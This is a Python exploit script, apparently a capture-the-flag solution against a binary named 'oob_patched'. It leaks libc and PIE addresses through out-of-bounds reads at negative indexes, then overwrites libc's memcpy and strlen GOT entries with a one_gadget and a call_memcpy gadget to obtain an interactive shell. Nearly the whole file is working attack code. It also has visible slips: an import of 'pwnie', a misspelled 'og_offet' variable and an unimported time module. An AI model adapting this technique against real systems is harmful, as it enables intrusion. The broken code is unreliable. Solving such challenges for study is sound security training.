#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./oob_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *main
# brva 0x1308
brva 0x139A
b *puts+19

c
'''.format(**locals())

# ==================== EXPLOIT ====================

def init():
    global p

    p = start()

def choice(option: int): 
    sla(b'> ', f'{option}'.encode())

def exploit():

    leak = b''
    for i in range(6):
        choice(1)
        sla(b': ', f'{-104 + i}'.encode())
        byte = rl()[:-1]    
        leak += byte

    puts = u64(leak.ljust(0x8, b'\0'))
    libc.address = puts - libc.sym.puts

    info('libc base: %#x', libc.address)

    leak = b''
    for i in range(6):
        choice(1)
        sla(b': ', f'{-632 + i}'.encode())
        byte = rl()[:-1]    
        leak += byte

    __do_global_dtors_aux = u64(leak.ljust(0x8, b'\0'))
    exe.address = __do_global_dtors_aux - exe.sym.__do_global_dtors_aux

    info('pie base: %#x', exe.address)

    strlen = libc.address + 0x219098
    memcpy = libc.address + 0x219160
    call_memcpy = libc.address + 0x2CDC4
    oob = exe.address + 0x4010
    info('strlen: %#x', strlen)
    info('memcpy: %#x', memcpy)
    info('call_memcpy: %#x', call_memcpy)
    info('oob: %#x', oob)

    # offset = libc_got - oob
    # info('offset: %#i', oob)
    og_offset = [965873, 965877, 965880, 965970, 966056, 966063, 966067]
    og = libc.address + og_offet[2]
    info('og: %#x', og)

    # rop = ROP(libc)
    # pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    # ret = pop_rdi + 1

    choice(2)
    sla(b': ', f'{memcpy - oob}'.encode())
    sla(b': ', str(og).encode())

    choice(2)
    sla(b': ', f'{strlen - oob}'.encode())
    sla(b': ', str(call_memcpy).encode())

    interactive()

def main():

    init()
    exploit()

if __name__ == '__main__':
    main()
